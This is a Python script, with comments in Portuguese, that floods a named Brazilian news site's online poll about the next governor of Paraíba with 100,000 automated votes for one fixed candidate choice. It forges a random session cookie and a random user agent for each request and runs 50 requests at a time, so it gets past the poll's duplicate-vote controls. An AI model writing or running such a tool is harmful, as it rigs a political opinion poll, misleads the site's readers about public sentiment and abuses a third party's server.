import httpx
import uuid
import asyncio
from fake_useragent import UserAgent
from tqdm import tqdm

# Configurações
URL_ENQUETE = "https://www.polemicaparaiba.com.br/politica/enquete-polemica-paraiba-em-quem-voce-votaria-para-ser-o-proximo-governador-da-paraiba/"
NUMERO_DE_VOTOS = 100000
CONCURRENCY = 50  # Reduzido para evitar sobrecarga
LOG_INTERVAL = 200

ua = UserAgent()
success = 0
errors = 0

async def enviar_voto(client, semaphore, pbar):
    global success, errors
    async with semaphore:  # Controla a concorrência
        try:
            session_id = uuid.uuid4().hex
            cookie_value = f"{session_id[:8]}-{session_id[8:12]}-{session_id[12:16]}-{session_id[16:20]}-{session_id[20:]}"
            
            boundary = f"boundary{uuid.uuid4().hex}"
            
            data = (
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="totalpoll[choices][9368332c-8ee9-447c-9009-3bab6e2e6107][]"\r\n\r\n'
                f'd6a33e0b-f11d-40d8-854b-b318f4cfa492\r\n'
                f'--{boundary}\r\n'
                'Content-Disposition: form-data; name="totalpoll[screen]"\r\n\r\n'
                'vote\r\n'
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="totalpoll[pollId]"\r\n\r\n'
                '1111618\r\n'
                f'--{boundary}\r\n'
                'Content-Disposition: form-data; name="totalpoll[action]"\r\n\r\n'
                'vote\r\n'
                f'--{boundary}--\r\n'
            )

            headers = {
                "User-Agent": ua.random,
                "Content-Type": f"multipart/form-data; boundary={boundary}"
            }

            response = await client.post(
                URL_ENQUETE,
                content=data.encode('utf-8'),
                headers=headers,
                cookies={
                    "tp_469f4fb05e034c5f02005fcefe4a590c": cookie_value,
                    "tp_888528ee1239aabb66bc30459c8a90eee": "1"
                },
                timeout=15  # Aumentado para evitar timeout precoce
            )
            
            success += 1
            if success % LOG_INTERVAL == 0:
                pbar.write(f"✅ Votos: {success} | 🛑 Erros: {errors} | Status: {response.status_code}")
            
        except Exception as e:
            errors += 1
            if errors % LOG_INTERVAL == 0:
                pbar.write(f"❌ Erro: {str(e)}")
        finally:
            pbar.update(1)

async def main():
    semaphore = asyncio.Semaphore(CONCURRENCY)  # Controlador de concorrência
    with tqdm(total=NUMERO_DE_VOTOS, desc="🔥 Enviando votos") as pbar:
        async with httpx.AsyncClient(
            http2=True,
            limits=httpx.Limits(max_connections=CONCURRENCY),
            follow_redirects=True  # Segue redirecionamentos
        ) as client:
            tasks = [enviar_voto(client, semaphore, pbar) for _ in range(NUMERO_DE_VOTOS)]
            await asyncio.gather(*tasks)

    print(f"\n🏁 Resultado final:")
    print(f"✅ Sucessos: {success} | 🛑 Erros: {errors}")
    print(f"📊 Taxa de sucesso: {(success/NUMERO_DE_VOTOS)*100:.2f}%")

if __name__ == "__main__":
    asyncio.run(main())